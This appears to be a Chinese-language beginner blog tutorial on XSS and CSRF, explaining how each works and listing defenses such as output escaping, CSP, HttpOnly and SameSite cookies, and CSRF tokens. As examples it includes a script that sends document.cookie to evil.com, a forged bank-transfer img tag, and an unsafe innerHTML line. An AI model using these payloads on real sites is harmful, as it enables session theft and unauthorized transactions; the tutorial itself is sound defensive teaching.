---
title: Web 安全入门：XSS 与 CSRF
createTime: 2026-10-21
permalink: /library/tech/web-security/
description: 两种最常见的 Web 攻击的原理与防御，写给不想被拖库的开发者
---
安全这块，平时看不见摸不着，出一次事就是大事。
新手常接触的两种攻击是 XSS 和 CSRF —— 名字听着就职，
其实原理都很朴素。这篇用大白话讲清楚，再给防御方案。

![XSS 与 CSRF 对比](/images/web-security.svg)

*图：一个往页面里塞脚本，一个冒用你的登录态*

## 一、XSS：往页面里塞脚本

### 原理

XSS（Cross-Site Scripting，跨站脚本攻击）的核心：
**攻击者让他的 JavaScript 在你的页面里运行**。

打个比方。网站有个评论功能，你把评论内容显示在页面上：

```js
// 危险写法：用户输入直接拼进 HTML
element.innerHTML = comment.content
```

攻击者提交一条评论，内容不是文字，而是一段：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

网站原样存进数据库，别人一打开评论区，这段脚本就在
**所有访问者的浏览器里**执行了 —— 偷 Cookie、改页面、
诱导点击，干什么都行。

### 三种类型

| 类型 | 数据从哪来 | 例子 |
| --- | --- | --- |
| 存储型 | 存进数据库，所有人都中招 | 上面的评论例子，最狠 |
| 反射型 | URL 参数，骗你点链接 | 搜索结果页把关键词拼进 HTML |
| DOM 型 | 前端 JS 直接拿用户输入用 | `location.hash` 拼进 innerHTML |

### 防御

1. **输出转义**（根本之道）：所有用户输入展示时转义
   `<`、`>`、`&`、`"`、`'`。现代框架
   （Vue/React 的默认插值）自动转义，用 `v-html` /
   `dangerouslySetInnerHTML` 才危险 —— **这两个 API
   等于把防线拆了，用之前洗三遍输入**；
2. **别用 innerHTML 拼用户数据**，用 `textContent`
   或框架的模板语法；
3. **CSP（内容安全策略）**：响应头声明允许加载哪些资源：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

这样即使脚本被塞进来，浏览器也不执行外部来源的脚本，
最后一根稻草；
4. **Cookie 设 HttpOnly**：JS 读不到 Cookie，偷也没用
（服务端 `Set-Cookie: token=xxx; HttpOnly`）。

## 二、CSRF：冒用你的登录态

### 原理

CSRF（Cross-Site Request Forgery，跨站请求伪造）利用的是
**浏览器会自动带 Cookie** 这个「贴心设计」。

场景：你登录着银行网站（Cookie 存在浏览器里）。
这时你打开一个钓鱼网页，页面里藏着：

```html
<img src="https://bank.com/transfer?to=hacker&amount=10000">
```

浏览器一看是图片请求，自动带上银行网站的 Cookie 就发了。
银行服务端看到合法的登录态，钱就转走了。

**注意**：整个过程中攻击者不需要知道你的密码，
甚至不需要读到响应 —— 他只是「借你的手按了按钮」。
（img 方式拿不到响应，但转账这种「不需要看结果」的操作，
目的已经达到了。）

### 和 XSS 的区别

| | XSS | CSRF |
| --- | --- | --- |
| 攻击目标 | 你的页面/用户 | 服务端（借用户之手） |
| 需要 | 能往页面注入内容 | 用户处于登录状态 |
| 偷的是 | Cookie、能执行任意 JS | 借登录态发请求 |
| 防御思路 | 转义 + CSP | Token + SameSite |

### 防御

1. **CSRF Token**：表单里带一个服务端生成的随机 Token，
   攻击者的页面拿不到（同源策略挡着），服务端验证 Token 不匹配就拒；
2. **SameSite Cookie**：`Set-Cookie: token=xxx; SameSite=Lax`。
   设为 Lax/Strict 后，跨站请求不带 Cookie，攻击直接失效。
   **现代浏览器默认就是 Lax，这是最省事的防线**；
3. **验证 Referer/Origin 头**：请求来源不对就拒；
4. **重要操作加二次确认**：转账输密码、验证码。虽然烦，
   但真管用。

## 三、日常开发的自查清单

不搞安全方向，把这些做到就能挡掉九成常见攻击：

- [ ] 用户输入展示一律转义（框架默认行为，别手动拆）；
- [ ] 不用 `v-html` / `dangerouslySetInnerHTML` 拼用户内容；
- [ ] 登录 Cookie 设 `HttpOnly` + `SameSite=Lax`，HTTPS 下加 `Secure`；
- [ ] 接口有 CSRF Token 或 SameSite 双保险；
- [ ] 配好 CSP 响应头；
- [ ] 依赖定期更新（`npm audit` 看一眼，别装来路不明的包）；
- [ ] 错误信息别把堆栈、SQL、内部路径直接返给前端。

## 四、延伸一句

安全是**纵深防御**：一层漏了还有一层。
转义漏了有 CSP，CSP 漏了有 HttpOnly，
Cookie 保护了还有 SameSite。别指望单点措施包打天下，
这和「缓存要分层配」是一个思路 —— 见
[HTTP 缓存详解](./http-cache.md)。

## 小结

XSS 是「进来捣乱」，防它靠**转义输出**；
CSRF 是「冒名顶替」，防它靠**SameSite Cookie + Token**。
两种攻击都不需要多高深的技术，利用的都是
「浏览器默认好心」和「开发者默认信任」。
把默认信任收回来，安全就到位了一半。
